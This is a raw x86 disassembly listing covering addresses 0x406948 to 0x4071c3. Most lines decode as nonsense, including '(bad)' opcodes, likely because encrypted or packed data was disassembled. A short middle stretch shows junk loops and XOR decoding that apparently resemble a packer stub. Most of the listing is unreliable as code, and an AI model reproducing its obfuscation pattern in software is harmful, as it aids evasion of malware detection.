  406948:	jmp    0x6e32a27f
  40694d:	fdivr  st(5),st
  40694f:	mul    DWORD PTR ds:0xee33727b
  406955:	cmp    bl,BYTE PTR [eax]
  406957:	inc    esi
  406958:	add    al,0x28
  40695a:	jns    0x406920
  40695c:	and    BYTE PTR [ebx-0x53],dh
  40695f:	jl     0x406985
  406961:	sub    edi,edi
  406963:	push   cs
  406964:	add    al,0x5e
  406966:	pop    edi
  406967:	(bad)  [edi-0x59]
  40696a:	xchg   edi,eax
  40696b:	aad    0x5c
  40696d:	jle    0x406946
  40696f:	sbb    esi,DWORD PTR [ebx]
  406971:	add    eax,0x387bbea6
  406976:	or     ah,ah
  406978:	imul   ecx,DWORD PTR [edi+0x4df9960e],0xffffffda
  40697f:	jmp    0xcfacbbab
  406984:	xor    DWORD PTR [esi],esp
  406986:	dec    edx
  406987:	xchg   edx,eax
  406988:	mov    edx,0xeccea000
  40698d:	and    BYTE PTR [edi-0x2d662d17],0x99
  406994:	push   edx
  406995:	cmp    DWORD PTR [ecx-0x492ff02],ebx
  40699b:	and    BYTE PTR [ecx-0x420ae0f6],cl
  4069a1:	fs pop eax
  4069a3:	jnp    0x4069de
  4069a5:	test   eax,0x687504f3
  4069aa:	mov    ah,0x4a
  4069ac:	and    esp,esi
  4069ae:	add    al,0xff
  4069b0:	call   0xa2e1b993
  4069b5:	jecxz  0x406a28
  4069b7:	shr    DWORD PTR ds:0x642ed04d,cl
  4069bd:	repz inc esp
  4069bf:	leave  
  4069c0:	sbb    eax,0xc4b9ad5b
  4069c5:	out    0x11,eax
  4069c7:	jp     0x40697e
  4069c9:	ins    WORD PTR es:[edi],dx
  4069cb:	push   ebx
  4069cc:	das    
  4069cd:	pop    es
  4069ce:	(bad)  
  4069cf:	pop    ds
  4069d0:	sbb    ebp,DWORD PTR gs:[eax+0x29e4b321]
  4069d7:	and    esi,DWORD PTR [ebp+0x6e]
  4069da:	test   BYTE PTR [edi+0x44],al
  4069dd:	inc    esp
  4069de:	xchg   esp,eax
  4069df:	out    0xd5,eax
  4069e1:	push   ebp
  4069e2:	aas    
  4069e3:	jmp    0x406a0a
  4069e5:	mov    ds:0xcb2b9e04,al
  4069ea:	add    BYTE PTR [edi+0x66],0x96
  4069ee:	mov    bl,0x51
  4069f0:	push   cs
  4069f1:	mov    ds:0x31d587c1,eax
  4069f6:	std    
  4069f7:	cmp    DWORD PTR [eax-0x1ded880f],edi
  4069fd:	bound  edx,QWORD PTR [ebx+0x4f712da6]
  406a03:	fistp  WORD PTR [ebx]
  406a05:	xchg   ecx,eax
  406a06:	bnd ret 
  406a08:	jge    0x406a56
  406a0a:	bound  eax,QWORD PTR [eax]
  406a0c:	mov    ah,0xaa
  406a0e:	cmp    eax,0x1c6f8d3
  406a13:	adc    eax,0x7011dbd0
  406a18:	stos   BYTE PTR es:[edi],al
  406a19:	ins    DWORD PTR es:[edi],dx
  406a1a:	add    edi,DWORD PTR [edx+0x66]
  406a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a1e:	xor    ah,BYTE PTR [ecx-0x2df22c7b]
  406a24:	sahf   
  406a25:	inc    ecx
  406a26:	mov    cl,BYTE PTR [esi]
  406a28:	sub    DWORD PTR [eax+0x12e6b367],ebx
  406a2e:	sti    
  406a2f:	test   eax,0x23b8c016
  406a34:	dec    edi
  406a35:	mov    DWORD PTR [ebx+0x74],ebp
  406a38:	sti    
  406a39:	mov    ebx,0x7bae6d1c
  406a3e:	test   eax,0x5cf42393
  406a43:	pop    edx
  406a44:	gs jp  0x4069e4
  406a47:	dec    ebp
  406a48:	(bad)  
  406a49:	fmul   QWORD PTR [edx-0x15]
  406a4c:	call   0x7a04d2b5
  406a51:	jmp    0x406a5c
  406a53:	cmp    BYTE PTR [edx+0x7a],al
  406a56:	mov    ah,0x2f
  406a58:	mov    eax,0x6c5cca6
  406a5d:	mov    dh,0xce
  406a5f:	jp     0x406a72
  406a61:	dec    ebp
  406a62:	iret   
  406a63:	adc    BYTE PTR [ecx-0x60],al
  406a66:	repz and al,0xf2
  406a69:	stc    
  406a6a:	sbb    al,0xb4
  406a6c:	sahf   
  406a6d:	dec    esp
  406a6e:	xor    DWORD PTR [ebx-0x79],esi
  406a71:	cmp    eax,eax
  406a73:	outs   dx,BYTE PTR ds:[esi]
  406a74:	into   
  406a75:	paddd  mm2,QWORD PTR [edx+0x73bf6338]
  406a7c:	jmp    0x406acc
  406a7e:	leave  
  406a7f:	fdiv   DWORD PTR [edi+0x57]
  406a82:	xchg   ebx,eax
  406a83:	jle    0x406a25
  406a85:	mov    cl,0x5d
  406a87:	xor    dh,cl
  406a89:	cmp    dh,0x9c
  406a8c:	sti    
  406a8d:	xchg   esi,eax
  406a8e:	rcl    DWORD PTR [eax-0x2cbfef2c],cl
  406a94:	ror    BYTE PTR [esi-0x7c],cl
  406a97:	sub    BYTE PTR [ebp+0x48a6f79e],bl
  406a9d:	es pop ss
  406a9f:	adc    al,0xb1
  406aa1:	out    0xaf,al
  406aa3:	repz mov ch,0x3f
  406aa6:	fwait
  406aa7:	xor    ecx,esi
  406aa9:	out    0xd6,eax
  406aab:	or     esp,ecx
  406aad:	pop    ds
  406aae:	enter  0x5769,0xee
  406ab2:	or     DWORD PTR [esi],edi
  406ab4:	int3   
  406ab5:	iret   
  406ab6:	inc    edx
  406ab7:	or     al,BYTE PTR [edi+0x7c4e1ee]
  406abd:	lock test eax,edi
  406ac0:	adc    dh,BYTE PTR [eax]
  406ac2:	js     0x406a79
  406ac4:	or     ebp,edi
  406ac6:	int    0xe5
  406ac8:	loop   0x406b45
  406aca:	cmp    BYTE PTR [esp-0x59],bh
  406ace:	xchg   ebx,eax
  406acf:	retf   
  406ad0:	xchg   edi,eax
  406ad1:	outs   dx,DWORD PTR ds:[esi]
  406ad2:	js     0x406a9a
  406ad4:	ss add cl,cl
  406ad7:	mov    dh,0xb
  406ad9:	inc    BYTE PTR [edi+0x227f64ac]
  406adf:	cmp    eax,0xc2030a3e
  406ae4:	shl    DWORD PTR [edi-0x31db5e90],cl
  406aea:	mov    ebx,0x2c5d44f5
  406aef:	mov    ch,0x6a
  406af1:	inc    edi
  406af2:	rol    ecx,0x43
  406af5:	scas   eax,DWORD PTR es:[edi]
  406af6:	aaa    
  406af7:	mov    al,0xc2
  406af9:	imul   esp,DWORD PTR [esi-0x44],0x683bf42c
  406b00:	adc    DWORD PTR [edi-0xf],esi
  406b03:	add    ebp,DWORD PTR [edx]
  406b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b06:	(bad)  
  406b07:	out    0x78,eax
  406b09:	into   
  406b0a:	sbb    eax,ebx
  406b0c:	or     ebp,ebx
  406b0e:	andnps xmm3,xmm2
  406b11:	pushf  
  406b12:	mov    al,0x68
  406b14:	push   edi
  406b15:	hlt    
  406b16:	jo     0x406aa7
  406b18:	ins    BYTE PTR es:[edi],dx
  406b19:	popa   
  406b1a:	sbb    al,0x7d
  406b1c:	fmul   DWORD PTR [ecx+0x3]
  406b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b20:	fcmovbe st,st(3)
  406b22:	pop    es
  406b23:	pusha  
  406b24:	cli    
  406b25:	pop    edx
  406b26:	push   es
  406b27:	push   ds
  406b28:	sahf   
  406b29:	ror    BYTE PTR [ebp+0x6c],0x7b
  406b2d:	and    al,0xbd
  406b2f:	je     0x406b96
  406b31:	xor    DWORD PTR [ebx],edx
  406b33:	imul   ebp,esp,0xffffffe6
  406b36:	pop    ebp
  406b37:	xchg   ebp,eax
  406b38:	enter  0x5b8a,0xc6
  406b3c:	in     al,dx
  406b3d:	popa   
  406b3e:	shl    eax,1
  406b40:	enter  0x67ec,0xa8
  406b44:	jae    0x406b4c
  406b46:	pop    ds
  406b47:	push   ecx
  406b48:	inc    esp
  406b49:	int    0xfe
  406b4b:	inc    ecx
  406b4c:	sub    DWORD PTR [edx+0x9],edx
  406b4f:	adc    eax,DWORD PTR [ecx]
  406b51:	popa   
  406b52:	std    
  406b53:	out    0x63,al
  406b55:	or     eax,DWORD PTR ss:[esi+0x1fe70b7a]
  406b5c:	xchg   BYTE PTR [eax+0x7226f633],ch
  406b62:	ins    DWORD PTR es:[edi],dx
  406b63:	lahf   
  406b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b65:	leave  
  406b66:	imul   ebx,DWORD PTR [ecx+0x7d9c05c5],0xffffffff
  406b6d:	mov    al,0x7a
  406b6f:	loopne 0x406afe
  406b71:	sub    BYTE PTR [esi+ecx*4],al
  406b74:	imul   ecx,DWORD PTR [edi+0x7b68b836],0xbffd0cd0
  406b7e:	or     DWORD PTR [ecx+0x2],ebx
  406b81:	jns    0x406b94
  406b83:	into   
  406b84:	test   ecx,esi
  406b86:	mov    edi,0x31d72b11
  406b8b:	jae    0x406b42
  406b8d:	hlt    
  406b8e:	lahf   
  406b8f:	mov    edx,0xf9703c90
  406b94:	leave  
  406b95:	mov    ds:0xb6751e98,eax
  406b9a:	rcl    BYTE PTR cs:[eiz*4-0x5837e26e],0xe5
  406ba3:	mov    al,ds:0x124d6ea
  406ba8:	mov    esi,0x9231f0d9
  406bad:	cli    
  406bae:	or     eax,0xf22ac3c1
  406bb3:	stc    
  406bb4:	in     al,0x7a
  406bb6:	pop    esi
  406bb7:	loopne 0x406ba6
  406bb9:	mov    DWORD PTR [ecx-0x3f],0x23bb8a88
  406bc0:	cdq    
  406bc1:	(bad)  
  406bc2:	aad    0xf4
  406bc4:	gs xchg esp,eax
  406bc6:	rol    BYTE PTR [edx+0x5b],0x9f
  406bca:	adc    al,0xf6
  406bcc:	rol    BYTE PTR [edx],1
  406bce:	sbb    BYTE PTR [ebp-0x476f210f],bh
  406bd4:	dec    ebx
  406bd5:	jmp    0x406c06
  406bd7:	clc    
  406bd8:	xchg   ecx,eax
  406bd9:	push   es
  406bda:	sub    eax,0xe87b867b
  406bdf:	pusha  
  406be0:	jp     0x406c46
  406be2:	loopne 0x406c3c
  406be4:	or     edi,DWORD PTR [esi+0x338e9fc3]
  406bea:	or     al,0x8b
  406bec:	rol    BYTE PTR [edx-0x4e],1
  406bef:	das    
  406bf0:	rcl    BYTE PTR [edi],0x41
  406bf3:	push   0x5c39fdec
  406bf8:	pop    es
  406bf9:	jnp    0x406c19
  406bfb:	xchg   edi,eax
  406bfc:	(bad)  
  406bfd:	add    ch,al
  406bff:	push   0x3623c267
  406c04:	jnp    0x406c71
  406c06:	cmp    al,0x3a
  406c08:	pop    esp
  406c09:	pop    edx
  406c0a:	inc    edx
  406c0b:	mov    cl,0xa3
  406c0d:	and    al,0x22
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	mov    dh,0xe7
  406c29:	repnz pop ebp
  406c2b:	cmp    dl,cl
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	or     eax,DWORD PTR [edi]
  406c35:	js     0x406bee
  406c37:	call   0x9d64:0x45176c1e
  406c3e:	lods   eax,DWORD PTR ds:[esi]
  406c3f:	xchg   esi,eax
  406c40:	xchg   ebx,eax
  406c41:	cmc    
  406c42:	push   esi
  406c43:	mov    bl,0xf6
  406c45:	or     eax,0x2ba39488
  406c4a:	xlat   BYTE PTR ds:[ebx]
  406c4b:	xchg   esp,eax
  406c4c:	mov    eax,0xe560b3df
  406c51:	sbb    al,0x53
  406c53:	or     BYTE PTR [ecx],0x62
  406c56:	into   
  406c57:	xchg   ebp,eax
  406c58:	ret    
  406c59:	fisttp QWORD PTR [eax]
  406c5b:	(bad)  
  406c5c:	dec    ecx
  406c5d:	ins    BYTE PTR es:[edi],dx
  406c5e:	retf   
  406c5f:	cmp    dl,bl
  406c61:	add    eax,0x71cae9b2
  406c66:	push   edx
  406c67:	fsubr  DWORD PTR [edx+0x9075c34]
  406c6d:	ret    
  406c6e:	(bad)  
  406c6f:	push   ebp
  406c70:	dec    esp
  406c71:	sbb    BYTE PTR [edx],ch
  406c73:	into   
  406c74:	arpl   WORD PTR [edi+edx*1],di
  406c77:	ins    BYTE PTR es:[di],dx
  406c79:	ror    DWORD PTR [esi+0x41b52154],1
  406c7f:	aad    0x59
  406c81:	imul   ecx,DWORD PTR [edi+0x778d05da],0xffffffce
  406c88:	add    BYTE PTR [edi-0x6ad1a1cd],dl
  406c8e:	dec    ebx
  406c8f:	stos   DWORD PTR es:[edi],eax
  406c90:	pusha  
  406c91:	jge    0x406c39
  406c93:	cmp    ecx,DWORD PTR [ebp+0x78]
  406c96:	out    dx,eax
  406c97:	pushf  
  406c98:	adc    DWORD PTR [ecx-0x77e15c23],ecx
  406c9e:	out    0x91,al
  406ca0:	test   al,0xfa
  406ca2:	(bad)  
  406ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ca4:	inc    edx
  406ca5:	push   esi
  406ca6:	in     al,dx
  406ca7:	lahf   
  406ca8:	inc    ebx
  406ca9:	daa    
  406caa:	jmp    0x4a5d:0x6ab8d4b
  406cb1:	jo     0x406c6f
  406cb3:	cmp    al,0x38
  406cb5:	jnp    0x406c88
  406cb7:	js     0x406cc8
  406cb9:	(bad)  
  406cbb:	pop    edi
  406cbc:	cmp    edi,DWORD PTR [bx]
  406cbf:	xchg   DWORD PTR [ebx+0x19],ecx
  406cc2:	inc    esi
  406cc3:	mov    dh,0xb2
  406cc5:	hlt    
  406cc6:	pop    ds
  406cc7:	xchg   edx,eax
  406cc8:	(bad)  
  406cc9:	dec    esi
  406cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ccb:	xor    al,0xc3
  406ccd:	cwde   
  406cce:	jnp    0x406d00
  406cd0:	mov    edx,0xf56a0b59
  406cd5:	or     eax,0x88395011
  406cda:	sub    ebp,DWORD PTR [ebx]
  406cdc:	daa    
  406cdd:	test   DWORD PTR [ecx+0x46c17946],ecx
  406ce3:	sbb    DWORD PTR [esi+0xd],ebx
  406ce6:	mov    cl,0x5
  406ce8:	or     DWORD PTR [ebx+0x53011ca3],esp
  406cee:	pop    edi
  406cef:	sbb    ecx,esp
  406cf1:	xor    BYTE PTR ds:0x89201e5d,al
  406cf7:	loop   0x406cd0
  406cf9:	test   BYTE PTR [esi],bl
  406cfb:	fdiv   QWORD PTR [ecx]
  406cfd:	(bad)
  406d02:	fnstcw WORD PTR [ecx]
  406d04:	cmp    DWORD PTR [edx+0x35],0xffa14fd5
  406d0b:	and    BYTE PTR [edx-0xcc307c4],dl
  406d11:	fwait
  406d12:	cmp    eax,0xf287b9ca
  406d17:	inc    ebx
  406d18:	cmp    al,dh
  406d1a:	dec    esi
  406d1c:	mov    eax,0xdca917ba
  406d21:	lods   eax,DWORD PTR ds:[esi]
  406d22:	(bad)  
  406d23:	cld    
  406d24:	push   0xffffffa6
  406d26:	lods   al,BYTE PTR ds:[esi]
  406d27:	mov    ah,0x60
  406d29:	lahf   
  406d2a:	xchg   esi,eax
  406d2b:	cs mov edi,0x463d0185
  406d31:	nop
  406d32:	fimul  DWORD PTR cs:[ebx]
  406d36:	(bad)  
  406d37:	jecxz  0x406da2
  406d39:	in     al,dx
  406d3a:	pop    ecx
  406d3b:	sar    BYTE PTR [esi-0x25],cl
  406d3e:	les    edi,FWORD PTR [esi-0x744692b7]
  406d44:	imul   ebx,DWORD PTR [ecx-0x2bde2ae6],0xa4b68c0e
  406d4e:	ins    DWORD PTR es:[edi],dx
  406d4f:	and    edx,DWORD PTR [eax*8+0x8be00d1]
  406d56:	mov    esi,0x795d2848
  406d5b:	xor    BYTE PTR [esi+0x2f],al
  406d5e:	(bad)  
  406d5f:	loopne 0x406daa
  406d61:	iret   
  406d62:	pop    ecx
  406d63:	rol    ecx,cl
  406d65:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  406d67:	mov    ah,0xdb
  406d69:	icebp  
  406d6a:	jg     0x406d6e
  406d6c:	mov    BYTE PTR [eax],dh
  406d6e:	repnz (bad) 
  406d70:	mov    WORD PTR [edi+0x5a],ss
  406d73:	and    DWORD PTR ds:0xcbf2347e,ebp
  406d79:	sbb    DWORD PTR [ebx+edx*4-0x44d59d03],esi
  406d80:	mov    ds:0x73c72139,eax
  406d85:	xchg   ebx,eax
  406d86:	ds (bad) 
  406d88:	push   ebp
  406d89:	or     cl,BYTE PTR [ecx]
  406d8b:	sub    DWORD PTR [eax],0x1d48479a
  406d91:	(bad)  
  406d92:	es mov al,0x69
  406d95:	or     eax,0xb61a68ff
  406d9a:	mov    ch,0xa1
  406d9c:	pushf  
  406d9d:	or     ch,bh
  406d9f:	or     DWORD PTR [ebx-0x1d252348],0xffffff90
  406da6:	sub    DWORD PTR [eax+0x59],0xffffffd6
  406daa:	pop    edx
  406dab:	cmc    
  406dac:	ja     0x406de1
  406dae:	aad    0x3f
  406db0:	lahf   
  406db1:	push   es
  406db2:	div    BYTE PTR [ebx]
  406db4:	pop    eax
  406db5:	cmc    
  406db6:	jl     0x406e2b
  406db8:	jmp    0xf564:0x9320c3b4
  406dbf:	pushf  
  406dc0:	inc    ecx
  406dc1:	mul    eax
  406dc3:	lods   al,BYTE PTR ds:[esi]
  406dc4:	inc    eax
  406dc5:	in     eax,0xf3
  406dc7:	and    al,0x54
  406dc9:	sti    
  406dca:	dec    esp
  406dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dcc:	call   0xbd181dfb
  406dd1:	xchg   DWORD PTR [ebx-0x14],eax
  406dd4:	(bad)  
  406dd5:	cmp    al,BYTE PTR [edx-0x2f4cd418]
  406ddb:	push   0x8fe58c1b
  406de0:	aam    0x66
  406de2:	adc    al,0x78
  406de4:	jg     0x406e2f
  406de6:	sbb    edi,DWORD PTR [ebx]
  406de8:	in     eax,dx
  406de9:	cmp    eax,0xcd96b1da
  406dee:	cmp    DWORD PTR [esi],eax
  406df0:	xor    al,0xfd
  406df2:	ret    0xad5a
  406df5:	cmp    al,0x3e
  406df7:	(bad)  
  406df8:	fdivr  DWORD PTR [eax+eiz*2+0x316cb05c]
  406dff:	jns    0x406de7
  406e01:	mov    al,ds:0x8eb395de
  406e06:	xor    ah,BYTE PTR [eax-0x948adea]
  406e0c:	push   eax
  406e0d:	fild   DWORD PTR [ebp-0x64]
  406e10:	dec    edi
  406e11:	repnz (bad) 
  406e13:	fnstsw WORD PTR [edi]
  406e15:	jnp    0x406e7b
  406e17:	mov    ah,0x79
  406e19:	clc    
  406e1a:	pop    ebx
  406e1b:	push   ecx
  406e1c:	jecxz  0x406d9f
  406e1e:	xor    al,0x2
  406e20:	mov    al,0xcb
  406e22:	stc    
  406e23:	xchg   DWORD PTR [ebp-0x2285ea5c],edi
  406e29:	xchg   edi,eax
  406e2a:	int    0xc8
  406e2c:	(bad)  [ebx+edi*4]
  406e2f:	jmp    0x6eac:0x80d99130
  406e36:	sbb    al,0xe1
  406e38:	add    al,bh
  406e3a:	addr16 (bad) 
  406e3d:	or     eax,edx
  406e3f:	push   es
  406e40:	xchg   edx,eax
  406e41:	inc    edx
  406e42:	sub    BYTE PTR [eax+0xa9a2ddf],dh
  406e48:	fcom   st(2)
  406e4a:	cmp    eax,0xcd73ae57
  406e4f:	mov    dl,0x33
  406e51:	xor    DWORD PTR [eax],0x644bba4b
  406e57:	or     ecx,DWORD PTR [esi-0x23dc31c8]
  406e5d:	dec    esi
  406e5e:	inc    esi
  406e5f:	add    eax,DWORD PTR [ecx-0x2e54918c]
  406e65:	(bad)  
  406e66:	shr    DWORD PTR [esp+edi*8-0x720753c1],0x9e
  406e6e:	and    al,0x33
  406e70:	mov    ebp,0x4987267e
  406e75:	jl     0x406e7f
  406e77:	jno    0x406e95
  406e79:	mov    esp,DWORD PTR [ecx]
  406e7b:	adc    eax,0xd9172ece
  406e80:	jmp    0xb08dee35
  406e85:	cs xchg dl,bh
  406e88:	pop    ecx
  406e89:	xchg   esp,eax
  406e8a:	inc    ebp
  406e8b:	sub    BYTE PTR [ebx+0x52742e19],ah
  406e91:	add    edx,DWORD PTR [edi-0x17144607]
  406e97:	mov    eax,0x88a8ad1b
  406e9c:	xchg   edx,eax
  406e9d:	cmc    
  406e9e:	push   ds
  406e9f:	and    BYTE PTR [esp+edi*2],bh
  406ea2:	jmp    0x406ede
  406ea4:	gs addr16 retf 
  406ea7:	add    bl,BYTE PTR [ecx]
  406ea9:	pop    eax
  406eaa:	pop    ecx
  406eab:	ror    BYTE PTR ds:[ecx+ecx*1+0x154e8f2a],0xba
  406eb4:	stos   DWORD PTR es:[edi],eax
  406eb5:	sbb    ah,BYTE PTR ds:0x67cc0549
  406ebb:	dec    ebp
  406ebc:	push   ecx
  406ebd:	pop    esi
  406ebe:	ds pushf 
  406ec0:	hlt    
  406ec1:	pop    esi
  406ec2:	mov    dh,0xa3
  406ec4:	jmp    0xae5c:0x24394390
  406ecb:	imul   esp,DWORD PTR [ecx+0x29],0xffffff95
  406ecf:	adc    eax,ebx
  406ed1:	int3   
  406ed2:	jl     0x406e6f
  406ed4:	push   0xffffffdb
  406ed6:	dec    edi
  406ed7:	inc    ecx
  406ed8:	ja     0x406f59
  406eda:	jle    0x406e86
  406edc:	adc    ebp,DWORD PTR [edx]
  406ede:	sbb    al,0x25
  406ee0:	push   eax
  406ee1:	aad    0x73
  406ee3:	jb     0x406ee2
  406ee5:	inc    eax
  406ee6:	stc    
  406ee7:	mov    ecx,0xe4d441ff
  406eec:	outs   dx,DWORD PTR ds:[esi]
  406eed:	outs   dx,DWORD PTR ds:[esi]
  406eee:	xchg   BYTE PTR [ebx+0x23213342],al
  406ef4:	pop    edi
  406ef5:	sar    BYTE PTR [edi-0x61],0x1b
  406ef9:	mov    bh,0x1f
  406efb:	add    BYTE PTR [ebp+0x56],ah
  406efe:	dec    esp
  406eff:	xchg   BYTE PTR [edx+0x320bf553],ah
  406f05:	jnp    0x406e99
  406f07:	xchg   ecx,eax
  406f08:	mov    dl,0xab
  406f0a:	cmc    
  406f0b:	loope  0x406f75
  406f0d:	push   esp
  406f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f0f:	pop    ebx
  406f10:	mov    esp,0x10d84901
  406f15:	jl     0x406f29
  406f17:	pop    ds
  406f18:	sub    DWORD PTR gs:[ecx+0x3c4010ed],ecx
  406f1f:	in     al,0xce
  406f21:	dec    esi
  406f22:	mov    eax,0x4978ffa3
  406f27:	sti    
  406f28:	das    
  406f29:	sbb    al,0x91
  406f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2d:	daa    
  406f2e:	or     DWORD PTR [eax-0x7c9d24e2],esp
  406f34:	cmp    bl,BYTE PTR [esi+0x17]
  406f37:	dec    eax
  406f38:	xchg   esi,eax
  406f39:	pop    ebx
  406f3a:	pop    ebp
  406f3b:	jnp    0x406f71
  406f3d:	inc    esp
  406f3e:	sub    DWORD PTR [ebx-0x43ecb1b],0x3a32c43f
  406f48:	test   BYTE PTR [ebp-0x7cba9398],0x37
  406f4f:	hlt    
  406f50:	iret   
  406f51:	mov    ds:0x9001c79c,eax
  406f56:	inc    ebx
  406f57:	ss add esp,ebp
  406f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f5b:	cmc    
  406f5c:	(bad)  
  406f5d:	sbb    eax,0x7f45ad2d
  406f62:	aad    0x1a
  406f64:	fwait
  406f65:	push   ds
  406f66:	mov    ds:0xc5f672fe,eax
  406f6b:	push   edx
  406f6c:	jmp    0x406fd0
  406f6e:	jno    0x406f6f
  406f70:	enter  0xad1a,0xcf
  406f74:	test   BYTE PTR [esi+0x5bcbfafc],ah
  406f7a:	aam    0x25
  406f7c:	call   0xa2b0:0x827f0dd6
  406f83:	call   0xd9e7ff8d
  406f88:	ins    BYTE PTR es:[edi],dx
  406f89:	bound  eax,QWORD PTR [edx]
  406f8b:	call   0x819692
  406f90:	jbe    0x406f6f
  406f92:	jge    0x406f9c
  406f94:	add    BYTE PTR [bp-0x27],bh
  406f98:	jl     0x406f54
  406f9a:	call   0x324:0xeb2ce6d5
  406fa1:	ret    0x2ca3
  406fa4:	and    al,BYTE PTR [ecx+0x0]
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430596,0x19
  406fd8:	cmp    DWORD PTR ds:0x430596,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430596,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42ebc4
  406ffd:	cmp    DWORD PTR ds:0x430596,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430596
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430596,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430596
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430596,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430656,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43064a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ef18,0x42ef20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ef10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ef1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ef1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ef1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ef1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eca4
  4070a9:	cmp    DWORD PTR ds:0x42ef1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ef1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ef1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ef1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43065a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ef28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ef28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ef28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ef28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ef28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ef24
  407123:	call   DWORD PTR ds:0x42eca8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4305ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430592,0x17
  407147:	cmp    DWORD PTR ds:0x430592,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430592,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42eb04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430592
  407179:	dec    eax
  40717a:	mov    ds:0x430592,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x1ed9980e
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x40719c
  4071b2:	inc    ebp
  4071b3:	sub    al,0x69
  4071b5:	jbe    0x4071c5
  4071b7:	or     eax,DWORD PTR [esi-0x506b2a71]
  4071bd:	(bad)  
  4071be:	ja     0x407146
  4071c0:	dec    ebp
  4071c1:	out    dx,eax
  4071c2:	ins    DWORD PTR es:[edi],dx
  4071c3:	pop    edi
